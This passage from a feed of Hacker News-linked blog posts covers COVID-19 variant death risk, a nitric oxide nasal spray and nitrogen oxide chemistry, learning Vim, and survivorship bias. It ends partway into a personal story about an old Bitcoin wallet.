<p>A previous study did not show evidence that viruses of the B.1.1.7 lineage were associated with an increased risk of hospitalization or death. However upon examination of additional data from three separate studies&nbsp;<a href="https://app.box.com/s/3lkcbxepqixkg4mv640dpvvg978ixjtf/file/768458300892">NERVTAG concludes</a>&nbsp;that there is a ‘realistic possibility that infection with VOC B.1.1.7 is associated with an increased risk of death compared to infection with non-VOC viruses’. This conclusion was reached by statistical analyses of reported death rates among individuals infected with VOC B.1.1.7 or non-VOC viruses. For example, in one study the relative hazard of death was 1.35 (with a 95% confidence interval of 1.08-1.68). In another study the mean ratio of case fatality ratios between cases caused by VOC or non-VOC viruses was 1.36 (95% CI 1.18-1.56). These are small differences with large confidence intervals ranging from no effect to more effect, and the authors note that the absolute risk of death remains low. The statistics are computed by analyzing a limited dataset of all COVID-19 related deaths (8%) and consequently might be in error. Furthermore, there does not appear to be an increased risk of hospitalization associated with infection by VOC viruses. My reading of this report is that it mainly serves as a warning to continue genomic surveillance of variants with respect to death risk and does not come to a conclusion on causality.</p>



<p>Update: Novavax just released the <a href="https://www.nytimes.com/2021/01/28/health/covid-vaccine-novavax-south-africa.html">first results</a> of their phase 3, spike-protein based COVID-19 vaccine. Efficacy was nearly 90% in the UK, but in a smaller trial in South Africa it was 50% against the B.1.135 variant. </p>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/"
    dc:identifier="https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/"
    dc:title="SARS-CoV-2 variants of concern"
    trackback:ping="https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/trackback/" />
</rdf:RDF>-->
</div></article><h2>Reader Interactions</h2>	<!-- #respond -->
	</main></div></div></div>]]>
            </description>
            <link>https://www.virology.ws/2021/01/28/sars-cov-2-variants-of-concern/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973815</guid>
            <pubDate>Sat, 30 Jan 2021 22:48:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is there NO (Nitric Oxide) way to stop Covid-19?]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25973555">thread link</a>) | @bukka
<br/>
January 30, 2021 | https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/ | <a href="https://web.archive.org/web/*/https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div data-shortcode="caption" id="attachment_3568"><p><a href="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg"><img loading="lazy" aria-describedby="caption-attachment-3568" data-attachment-id="3568" data-permalink="https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/human-3269822_1280/" data-orig-file="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg" data-orig-size="1280,853" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Nasal spray" data-image-description="" data-medium-file="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=300" data-large-file="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=584" src="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=300&amp;h=200" alt="" width="300" height="200" srcset="https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=300&amp;h=200 300w, https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=600&amp;h=400 600w, https://thechronicleflask.files.wordpress.com/2021/01/human-3269822_1280.jpg?w=150&amp;h=100 150w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p id="caption-attachment-3568">UK trials have begun of a nasal spray that could prevent COVID-19 infections</p></div>
<p>A few weeks ago, it was announced that <a href="http://www.ashfordstpeters.nhs.uk/latest-news/2610-covid-busting-nasal-spray-begins-uk-trials" target="_blank" rel="noopener">UK trials were beginning of a nasal spray proven to kill 99.9% of the coronavirus</a> that causes <a href="https://en.wikipedia.org/wiki/Coronavirus_disease_2019" target="_blank" rel="noopener">COVID-19</a>. The idea, broadly, is that you’d use the spray first thing in the morning, during the day after social interactions, and then again in the evening — and it would prevent the virus from taking hold and making you ill.</p>
<p>Awesome, right? Simple, cheap, portable. Sort of like cleaning your teeth regularly: prevention rather than cure. Combined with a <a href="https://wellcome.org/news/what-different-types-covid-19-vaccine-are-there" target="_blank" rel="noopener">vaccine</a>, particularly for anyone at high risk such as those in healthcare settings, it could put a stop to the whole thing — and might also turn out to be effective on other, less deadly but still annoying, viruses.</p>
<p>But, I hear you ask, what is it? Because if I’m going to squirt something up my nose several times a day, I have questions…</p>
<div data-shortcode="caption" id="attachment_3570"><p><a href="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png"><img loading="lazy" aria-describedby="caption-attachment-3570" data-attachment-id="3570" data-permalink="https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/nitric-oxide-3d-vdw/" data-orig-file="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png" data-orig-size="1024,809" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Nitric-oxide-3D-vdW" data-image-description="" data-medium-file="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=300" data-large-file="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=584" src="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=175&amp;h=138" alt="" width="175" height="138" srcset="https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=175&amp;h=138 175w, https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=350&amp;h=276 350w, https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=150&amp;h=119 150w, https://thechronicleflask.files.wordpress.com/2021/01/nitric-oxide-3d-vdw.png?w=300&amp;h=237 300w" sizes="(max-width: 175px) 100vw, 175px"></a></p><p id="caption-attachment-3570">Nitric oxide has the chemical formula NO</p></div>
<p>Fair enough. It’s actually, mostly, <a href="https://en.wikipedia.org/wiki/Nitric_oxide" target="_blank" rel="noopener">nitric oxide</a>, which has the chemical formula NO.</p>
<p>Yes, there are plenty of wordplay options here. The researchers have already jammed the letters NO into their company name, and done the acronym thing, to get <a href="https://www.clinicaltrialsarena.com/news/sanotize-trials-nasal-spray/" target="_blank" rel="noopener">SaNOtize Nitric Oxide Nasal Spray</a> (NONS). If the trials are successful, it’s probably only a matter of time before we get: “Say NO to coronavirus!” marketing. (Any ad agencies reading this, I’m claiming copyright.)</p>
<p>But that aside, unless you’re a chemist you might be thinking about some half-remembered chemical names and frowning at this point. Isn’t that… used in rocket fuel? Or… wait… isn’t that… the nasty smoggy stuff that causes lung problems?</p>
<p>Ah, well, there are several nitrogen oxides. Let me summarise:</p>
<ul>
<li>NO is <a href="https://en.wikipedia.org/wiki/Nitric_oxide" target="_blank" rel="noopener">nitrogen monoxide or nitric oxide</a> — that’s what we’re talking about here.</li>
<li>NO<sub>2</sub> is <a href="https://en.wikipedia.org/wiki/Nitrogen_dioxide" target="_blank" rel="noopener">nitrogen dioxide</a> — forms when combustion happens in air, and it’s the one that’s brown and smells horrible, and is probably most associated with <a href="https://en.wikipedia.org/wiki/Smog#Photochemical_smog" target="_blank" rel="noopener">photochemical smog&nbsp;</a>(although atmospheric NO has a significant role there, too).</li>
<li>N<sub>2</sub>O is <a href="https://en.wikipedia.org/wiki/Nitrous_oxide" target="_blank" rel="noopener">nitrous oxide</a>, sometimes just “nitrous” — that’s the one that’s also called laughing gas and is used as an anaesthetic, and “<a href="https://en.wikipedia.org/wiki/Recreational_use_of_nitrous_oxide" target="_blank" rel="noopener">recreationally</a>,” as well as being used to increase the power output of engines.</li>
<li>NO<sub>3</sub> is <a href="https://en.wikipedia.org/wiki/Nitrate_radical" target="_blank" rel="noopener">nitrogen trioxide</a> — this is a radical, with an unpaired electron. It’s unstable, but it is important in ozone chemistry.</li>
<li>N<sub>2</sub>O<sub>4</sub> is <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide" target="_blank" rel="noopener">nitrogen tetroxide or dinitrogen tetroxide</a> — this is important because it forms <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide#Structure_and_properties" target="_blank" rel="noopener">an equilibrium with NO<sub>2</sub></a> so the two can be thought of an interconvertible, and also because it’s <a href="https://en.wikipedia.org/wiki/Dinitrogen_tetroxide#Use_as_a_rocket_propellant" target="_blank" rel="noopener">used as a rocket propellent</a>.</li>
</ul>
<div data-shortcode="caption" id="attachment_3574"><p><a href="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg"><img loading="lazy" aria-describedby="caption-attachment-3574" data-attachment-id="3574" data-permalink="https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/industry-611668_1280/" data-orig-file="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg" data-orig-size="1280,653" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="industry-611668_1280" data-image-description="" data-medium-file="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=300" data-large-file="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=584" src="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=300&amp;h=153" alt="" width="300" height="153" srcset="https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=300&amp;h=153 300w, https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=600&amp;h=306 600w, https://thechronicleflask.files.wordpress.com/2021/01/industry-611668_1280.jpg?w=150&amp;h=77 150w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p id="caption-attachment-3574">Nitric oxides in the atmosphere cause photochemical smog.</p></div>
<p>There are <a href="https://en.wikipedia.org/wiki/Nitrogen_oxide" target="_blank" rel="noopener">other nitrogen oxides</a>, not to mention ions — but let’s not spend all day on this. Nitrogen forms this confusing hodgepodge of oxides because it has five electrons in its outermost shell (it’s in <a href="https://www.britannica.com/science/nitrogen-group-element" target="_blank" rel="noopener">group 15</a> of the periodic table) and because there’s not much difference in the <a href="https://en.wikipedia.org/wiki/Electronegativity" target="_blank" rel="noopener">electronegativities</a> of oxygen and nitrogen. So essentially, it can share electrons with oxygen to form bonds in a number of different ways to obtain a <a href="https://en.wikipedia.org/wiki/Electron_configuration#Noble_gas_configuration" target="_blank" rel="noopener">stable, full outer shell</a>.</p>
<p>For any students reading this, I’m sorry. You… pretty much just have to remember these. Yes, I know. That’s why experienced chemists so often use the shorthand <a href="https://en.wikipedia.org/wiki/NOx" target="_blank" rel="noopener">NOx </a>— we just can’t be bothered keeping all the names straight. (Okay, before someone shouts at me, actually NOx is handy because we’re often talking about more than one oxide at a time, and it allows us to easily express that.)</p>
<p>Back to NO. It’s a colourless gas, and it has an unpaired electron, which makes it a <a href="https://en.wikipedia.org/wiki/Radical_(chemistry)" target="_blank" rel="noopener">free radical</a>. And… here we go again. Aren’t we supposed to eat lots of <a href="https://en.wikipedia.org/wiki/Antioxidant" target="_blank" rel="noopener">antioxidant-</a>rich fruit and vegetables to mop up free radicals? They’re bad, aren’t they?</p>
<div data-shortcode="caption" id="attachment_3572"><p><a href="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg"><img loading="lazy" aria-describedby="caption-attachment-3572" data-attachment-id="3572" data-permalink="https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/viagra-70398_1280/" data-orig-file="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg" data-orig-size="1280,960" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="viagra-70398_1280" data-image-description="" data-medium-file="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=300" data-large-file="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=584" src="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=300&amp;h=225" alt="" width="300" height="225" srcset="https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=300&amp;h=225 300w, https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=600&amp;h=450 600w, https://thechronicleflask.files.wordpress.com/2021/01/viagra-70398_1280.jpg?w=150&amp;h=113 150w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p id="caption-attachment-3572">Viagra (Sildenafil) makes use of the nitric oxide pathway which causes blood vessels to dilate…</p></div>
<p>Yes and no. Free radicals are reactive species which damage cells and can cause illness and ageing. Too much exposure to free radicals causes something <a href="https://en.wikipedia.org/wiki/Oxidative_stress" target="_blank" rel="noopener">oxidative stress</a>, which is definitely bad. But. It turns out that nitrogen oxide is an important <a href="https://en.wikipedia.org/wiki/Gaseous_signaling_molecule" target="_blank" rel="noopener">signalling molecule</a>, that is, a molecule which is the body uses to send chemical signals from one place to another. In particular, nitrogen oxide “tells” the <a href="https://en.wikipedia.org/wiki/Nitric_oxide#Biological_functions" target="_blank" rel="noopener">smooth muscle around blood vessels to relax</a>, causing those blood vessels to dilate, and increasing blood flow. Viagra (aka <a title="" href="https://en.wikipedia.org/wiki/Sildenafil">Sildenafil</a>) uses the nitric oxide pathway, and I think we all know what that does, don’t we? Good.</p>
<p>Nitric oxide has also been shown to <a href="https://pubmed.ncbi.nlm.nih.gov/17170603/" target="_blank" rel="noopener">reduce blood pressure</a>, which is generally considered a good thing — <a href="https://www.nhs.uk/conditions/low-blood-pressure-hypotension/" target="_blank" rel="noopener">up to a point, obviously</a>. This is why you can buy lots of so-called <a href="https://www.medicalnewstoday.com/articles/326381" target="_blank" rel="noopener">nitric oxide supplements</a>, which, since nitrogen oxide is a gas at room temperature, don’t actually contain nitric oxide on its own. Rather, they’re a mixture of amino acids and other things that supposedly help the body to <em>make</em> NO. But it might be cheaper, and healthier, to eat plenty of beetroot or drink beetroot juice, since there’s evidence that <a href="https://pubmed.ncbi.nlm.nih.gov/29370244/" target="_blank" rel="noopener">does the same sort of thing</a>.</p>
<p>As always, <a href="https://en.wikipedia.org/wiki/The_dose_makes_the_poison" target="_blank" rel="noopener">the dose makes the poison</a>. Too <a href="https://en.wikipedia.org/wiki/Nitric_oxide#Occupational_safety_and_health" target="_blank" rel="noopener">much nitric oxide is definitely problematic</a>, but administered in the right way and in appropriate doses, it’s extremely safe.</p>
<p>It’s suggested that the nitric oxide in the <a href="https://sanotize.com/" target="_blank" rel="noopener">SaNOtize</a> nasal spray destroys the virus and also helps to stop viral replication within cells. Plus, it <a href="https://theconversation.com/what-is-the-ace2-receptor-how-is-it-connected-to-coronavirus-and-why-might-it-be-key-to-treating-covid-19-the-experts-explain-136928" target="_blank" rel="noopener">blocks the receptors</a> that the virus uses to enter cells in the first place. Essentially, it locks the doors and rains down fire on the potential intruders — nice work.</p>
<p>You only need to use the spray occasionally, because developing a COVID-19 infection isn’t instant. First the virus gets into your nose, then it attaches to cells, then it replicates, and <em>then</em> it sheds into your lungs. There are timescales involved here — so long as the spray is used every so often it should do the trick.</p>
<p>Another advantage is that this should, theoretically, work on other strains — where the current vaccines may not. So it could provide a very important stopgap when vaccination isn’t immediately available.</p>
<div data-shortcode="caption" id="attachment_3576"><p><a href="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg"><img loading="lazy" aria-describedby="caption-attachment-3576" data-attachment-id="3576" data-permalink="https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/facemask-5059928_1280/" data-orig-file="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg" data-orig-size="1280,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="facemask-5059928_1280" data-image-description="" data-medium-file="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=300" data-large-file="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=584" src="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=300&amp;h=200" alt="" width="300" height="200" srcset="https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=300&amp;h=200 300w, https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=600&amp;h=400 600w, https://thechronicleflask.files.wordpress.com/2021/01/facemask-5059928_1280.jpg?w=150&amp;h=100 150w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p id="caption-attachment-3576">This is only in the early stages of clinical trials so, for now, wear your mask.</p></div>
<p>All sounds fabulous, doesn’t it? It might be, but, we’re in the early stages with this. Clinical trials <a href="http://www.ashfordstpeters.nhs.uk/latest-news/2610-covid-busting-nasal-spray-begins-uk-trials" target="_blank" rel="noopener">have now started in the UK</a>, are already in <a href="https://sanotize.com/wp-content/uploads/2020/04/SaNOtize_HC_USU_release_FINAL.pdf" target="_blank" rel="noopener">Phase II in Canada</a> and have been approved to start in the USA. Researchers are hopeful, but we need to wait for the evidence.</p>
<p>So in the meantime, <a href="https://twitter.com/chronicleflask/status/1283015334732103682" target="_blank" rel="noopener">wear a mask</a>, <a href="https://chronicleflask.com/2020/03/26/cleaning-chemistry-awesome-soap/">wash your hands,</a> and take a vaccine if you’re offered one. Stay safe out there!</p>
<hr>
<p>If you’re studying chemistry, have you got your <a href="https://chronicleflask.com/2020/02/06/the-pocket-chemist/" target="_blank" rel="noopener">Pocket Chemist</a> yet? Why not grab one? It’s a hugely useful tool, and by buying one you’ll be supporting this site – it’s win-win! If you happen to <em>know</em> a chemist, it would make a brilliant stocking-filler! As would a set of <a href="https://chronicleflask.com/2020/08/10/more-from-genius-lab-gear-science-word-magnets/">chemistry word magnets</a>!</p>
<p>Like the <a href="https://www.facebook.com/Chronicleflask/">Chronicle Flask’s Facebook page</a> for regular updates, or follow <a href="https://twitter.com/chronicleflask" target="_blank" rel="noopener noreferrer">@chronicleflask on Twitter</a>. Content is © Kat Day 2021. You may share or link to anything here, but you must reference this site if you do. If you enjoy reading my blog, and especially if you’re using information you’ve found here to write a piece for which you will be paid, please consider buying me a coffee through <a href="http://ko-fi.com/katday" target="_blank" rel="noopener noreferrer">Ko-fi</a> using the button below.<br>
<a href="https://ko-fi.com/X7X1BBLF" target="_blank" rel="noopener noreferrer"><img src="https://az743702.vo.msecnd.net/cdn/kofi3.png?v=0" alt="Buy Me a Coffee at ko-fi.com" height="36"></a></p>
<p>Want something non-sciency to distract you from, well, everything? Why not check out my fiction blog: <a href="https://thefictionphial.wordpress.com/" target="_blank" rel="noopener">the fiction phial</a>.</p>


			
			
						</div></div>]]>
            </description>
            <link>https://chronicleflask.com/2021/01/30/is-there-no-way-to-stop-covid-19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973555</guid>
            <pubDate>Sat, 30 Jan 2021 22:18:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why learning the Vim text editor is worth it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25973495">thread link</a>) | @ingve
<br/>
January 30, 2021 | http://blog.vmsplice.net/2021/01/why-learning-vim-text-editor-is-worth-it.html | <a href="https://web.archive.org/web/*/http://blog.vmsplice.net/2021/01/why-learning-vim-text-editor-is-worth-it.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a href="https://www.vim.org/"><img alt="Vim logo, GNU General Public License v2 or Later" data-original-height="240" data-original-width="240" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Vimlogo.svg/240px-Vimlogo.svg.png" width="320"></a></p>

<p>Many tools come and go as our software and devices change - or we get bored and want to try something new and shiny. One of the few exceptions for me has been the <a href="https://www.vim.org/">Vim text editor</a>, which I use for programming, emails, and writing every day. In this post I want to share why Vim is remarkable but more generally why learning a text editor is a great investment.</p>

        <p>It may not be obvious why text editors are useful tools. Many programs, like web browsers, email clients, and <a href="https://en.wikipedia.org/wiki/Integrated_development_environment">integrated development environments (IDEs)</a>, have built-in text editing functionality. Why use a separate text editor? Text editors go deep. They are much more powerful than text boxes in browsers and email clients while being more general than IDEs. While IDEs often have excellent programming language-specific functionality, they are rarely used for other text editing tasks like writing emails or documents because they are specialized tools. Text editors strike a good balance of powerful editing and support for programming without being boxed into a narrow use-case.</p>

        <p>Getting started with a text editor is easy. Vim implements the arcane <a href="https://en.wikipedia.org/wiki/Vi">vi editor</a> user interface but has many <a href="https://www.youtube.com/playlist?list=PLcTu2VkAIIWzD2kicFNHN2c35XQCeZdsv">videos</a>, <a href="http://vimsheet.com/">cheatsheets</a>, and <a href="https://vim.fandom.com/wiki/Tutorial">tutorials</a> that make it fun to try. Really getting familiar with the features and customizing the editor to your own needs takes time though. This is true for any popular text editor because the number of settings, extensions, or plugins available can be huge. However, once you are familiar with a text editor you will have a powerful tool that can be used for most tasks involving writing or manipulating text. The time investment will pay off as you use the editor for todo lists, emails, documentation, programming, configuration files, and more.</p>

        <p>This explains why I've found Vim a useful and enduring tool that I use daily. But what makes it a particularly strong text editor compared to the other options? Text editors go in and out of fashion all the time. I remember many that attracted attention for a time but then faded away. Vim has remained popular and I think there are a few reasons for that.</p>

            <p><b>Powerful text editing plus IDE-like functionality.</b> The vi user interface is actually a language of text editing operators. The keys you press aren't just keyboard shortcuts, they are like a bytecode (!) for a text manipulation CPU that is <a href="https://en.wikipedia.org/wiki/Turing_complete">Turing-complete</a>. Years ago I wrote vi macros that solve the <a href="https://en.wikipedia.org/wiki/Stable_marriage_problem">stable marriage problem</a> to demonstrate this. For many geeks this alone might be enough to convince you to learn Vim! But on top of this crazy text editing power Vim also has IDE-like functionality including syntax highlighting, completion, code search and navigation, compiler error navigation, and diffing. There is a large collection of plugins and scripts if you want to extend Vim's functionality even further.</p>

  <p><b>Vim is ubiquitous.</b> It runs on all major operating systems but furthermore it is found on devices from tiny Wi-Fi routers to the largest servers. It has a GUI but also a terminal interface if you are connecting to a remote machine over SSH. I always find it strange when I see people use their editor of choice on their laptop but then use another, less-familiar editor when connecting to remote machines. Learn Vim and you can use it everywhere!</p>

  <p><b>Keyboard-friendly.</b> Constantly moving my hand between the mouse and keyboard is tiring and distracting. Vim has excellent keyboard support and many things can be done without leaving the <a href="https://en.wikipedia.org/wiki/Home_row#Home_row">home row</a> on the keyboard, including navigating, inserting, and deleting text. I find there is no need to use the arrow keys, mouse, or anything that is hard to reach.</p>

<p>If you are looking for a powerful text editor that you can use for many years then I recommend Vim. It's also worth looking at Emacs, which has a different angle but is also a good time investment. Looking back on 17 years of using Vim, I'm happy I stopped switching between language-specific IDEs and instead found a text editor capable of handling all tasks.</p>

</div></div>]]>
            </description>
            <link>http://blog.vmsplice.net/2021/01/why-learning-vim-text-editor-is-worth-it.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973495</guid>
            <pubDate>Sat, 30 Jan 2021 22:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is Survivorship Bias (2015)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25973412">thread link</a>) | @I_Byte
<br/>
January 30, 2021 | http://www.wisdomination.com/what-is-survivorship-bias/ | <a href="https://web.archive.org/web/*/http://www.wisdomination.com/what-is-survivorship-bias/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description articleBody">
      <p>One of the R.A.F.’s top priorities during WW2 was improving the odds that its notoriously expensive and strategically crucial bombers will make it back from bombing runs over Germany.</p>
<p>The returning airplanes were rigorously scrutinised, and military experts were busy designing improved armouring along the wings and the rear gunner’s station – the bits of the planes that tended to have the most holes in them.</p>
<p>This seemed like a sensible thing to do. Until a statistician by the name of&nbsp;<a href="http://en.wikipedia.org/wiki/Abraham_Wald" target="_blank">Abraham Wald</a>&nbsp;came along.</p>
<p><em>“You fucks”,</em> I imagine him saying, <em>“the bits where the planes that came back have holes are precisely the bits where it doesn’t matter. The planes are weakest where the ones you’re looking at are unscathed – precisely because the ones that got hit there didn’t come back. Reinforce the armouring where the planes that came back are immaculate.”</em></p>
<p>And substantially more planes started coming back.</p>
<p>Obvious. Ex post facto. Ex ante, practically invisible. Most people would make the same error as the experts.</p>
<p>When “fails”, or the things that didn’t make it through a certain selection process, are absent from statistical samples, which is most of the time, identifying decisive factors and points of failure becomes nontrivial – they cannot be divined just from the “wins”, or the things that did make it, without serious lateral thinking.</p>
<p>This principle is heavily in action whenever we try, for instance, to isolate the common features of successful athletes, artists, scientists, therapies, investment vehicles, companies or anything else in order to imitate them. <em>And then, reinforce the armouring along the wings.</em></p>
<p>This was my reaction when I figured this out and appreciated it fully:</p>
<p><a href="http://www.wisdomination.com/wp-content/uploads/2015/02/Joey-Tribbiani-Oh-My-God-Realization.gif" data-rel="lightbox"><img src="http://www.wisdomination.com/wp-content/uploads/2015/02/Joey-Tribbiani-Oh-My-God-Realization.gif" alt="Joey-Tribbiani-Oh-My-God-Realization" width="400" height="300"></a></p>
<p>&nbsp;<em>&nbsp;<b>©&nbsp;</b>Warner Bros</em></p>

<p>This, friends, is survivorship bias.</p>
    </div></div>]]>
            </description>
            <link>http://www.wisdomination.com/what-is-survivorship-bias/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25973412</guid>
            <pubDate>Sat, 30 Jan 2021 22:00:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A short story on my experiences with cryptocurrencies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25973260">thread link</a>) | @torgard
<br/>
January 30, 2021 | https://akseltorgard.com/skriv/2021-01-30_crypto.html | <a href="https://web.archive.org/web/*/https://akseltorgard.com/skriv/2021-01-30_crypto.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    <p>Back in early 2012, I did some online gambling on <strong><em>the dark web</em></strong> 🥸</p>
    <p>The currency was Bitcoins, which back then weren't worth anything, and practically couldn't be used for
      anything.
      Other than drugs, illicit activities, and whatever people were trying to scam you into buying.</p>
    <p>There was even a website you could visit once a day, which gave you a small amount of bitcoins - two cents if I
      recall - for free, <em>just 'cause.</em></p>
    <p><small>Side note: Those two bitcoin cents would be worth almost $700 at the time of writing.</small></p>
    <p>I ended up with a couple of hundred dollars in winnings. I was pretty good at poker and blackjack.</p>
    <p>... or probably just very lucky.</p>
    <p>I tried to get them paid out, but I couldn't figure out a way to do it. Neither Western Union nor PayPal -
      two of the more reasonable payout options on MtGox - worked in the Faroe Islands (which is were I lived at the
      time). Some people seemed to get them paid out as Amazon giftcards, but even Amazon was flaky at best in the
      Faroes.</p>
    <p>So I didn't get them paid out. They were stored in a file on my machine called wallet.dat, and there they
      remained.</p>
    <p>My interests in gambling and <strong><em>the deeeeep dark web</em></strong> waned, and I forgot about them. The
      wallet.dat file remained on my harddrive, lost to time.</p>
    <hr>
    <p><strong>Years later</strong>, in late 2017 I believe, bitcoins were exploding.</p>
    <p>I had no clue where the old harddrive was. And if I remember correctly, it broke back in 2013, and was
